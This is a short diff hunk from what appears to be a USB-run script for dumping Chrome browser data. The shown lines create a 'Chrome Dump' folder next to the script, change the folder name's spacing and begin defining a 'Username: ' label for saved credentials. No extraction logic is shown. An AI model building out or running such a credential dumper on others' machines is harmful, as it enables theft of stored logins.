@@ -28,8 +28,8 @@ Remastered by TheStandardPancake, credit to bluedangerforyou for writing the ori
 
 #setting up the file to dump info
 usb = os.path.abspath(__file__)
-os.makedirs(os.path.join(usb + "Chrome Dump"))
-path = os.path.join(usb + "Chrome Dump")
+os.makedirs(os.path.join(usb + " Chrome Dump"))
+path = os.path.join(usb + " Chrome Dump")
 
 #labels for easy use in the file
 username1 = "Username: "
